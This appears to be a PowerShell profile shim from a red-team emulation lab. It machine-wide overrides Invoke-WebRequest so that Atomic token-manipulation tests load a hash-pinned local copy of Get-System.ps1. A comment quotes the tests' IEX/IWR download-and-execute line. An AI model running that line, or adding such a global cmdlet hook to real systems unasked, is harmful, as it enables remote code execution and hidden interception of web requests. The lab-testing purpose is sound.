# VM3 token-offline shim (docs/design/vm3-session.md).
#
# The Atomic token tests (T1134.001 #1 and #2) fetch one script at run time:
#   IEX (IWR 'https://raw.githubusercontent.com/.../Get-System.ps1')
# On the isolated VM that download fails, so the technique never runs. This profile
# serves THAT ONE pinned URL from a pre-fetched, hash-pinned local copy and leaves every
# other request untouched. It changes nothing about the technique; it only removes the
# incidental network fetch. It contains no attack code — only a redirect to a local file.
#
# Install it machine-wide so the Atomic executor (a child powershell.exe) loads it:
#   Copy-Item token-offline-profile.ps1 "$PSHOME\Profile.ps1" -Force
# Fetch the script once during setup (NAT on), pin its hash, and set it below:
#   Invoke-WebRequest $CPES_TokenScriptUrl -OutFile C:\CPES-session\Get-System.ps1 -UseBasicParsing
#   (Get-FileHash C:\CPES-session\Get-System.ps1 -Algorithm SHA256).Hash   # -> paste into $CPES_TokenScriptSha256

$script:CPES_TokenScriptPath   = 'C:\CPES-session\Get-System.ps1'
$script:CPES_TokenScriptMatch  = 'Get-System.ps1'                 # URL substring this shim serves locally
$script:CPES_TokenScriptSha256 = 'SET-DURING-SETUP'               # pinned SHA-256 of the fetched file

function CPES-TokenScriptOk {
    if (-not (Test-Path $script:CPES_TokenScriptPath)) { return $false }
    if ($script:CPES_TokenScriptSha256 -eq 'SET-DURING-SETUP') { return $false }
    return (Get-FileHash $script:CPES_TokenScriptPath -Algorithm SHA256).Hash -eq $script:CPES_TokenScriptSha256
}

if (-not (CPES-TokenScriptOk)) {
    Write-Warning "CPES token-offline shim: $($script:CPES_TokenScriptPath) is missing or its SHA-256 does not match the pin. Token tests will not run offline until this is fixed (see VM3-RUNBOOK.md)."
}

# Proxy Invoke-WebRequest: serve the pinned URL locally, pass everything else through.
function Invoke-WebRequest {
    [CmdletBinding()]
    param([Parameter(Position = 0)][object]$Uri, [Parameter(ValueFromRemainingArguments = $true)]$Rest)
    if ("$Uri" -like "*$($script:CPES_TokenScriptMatch)*" -and (CPES-TokenScriptOk)) {
        $text = Get-Content $script:CPES_TokenScriptPath -Raw
        $obj = [pscustomobject]@{ Content = $text; StatusCode = 200; RawContent = $text }
        $obj | Add-Member -MemberType ScriptMethod -Name ToString -Value { $this.Content } -Force
        return $obj
    }
    Microsoft.PowerShell.Utility\Invoke-WebRequest @PSBoundParameters
}
Set-Alias -Name iwr -Value Invoke-WebRequest -Scope Global -Force
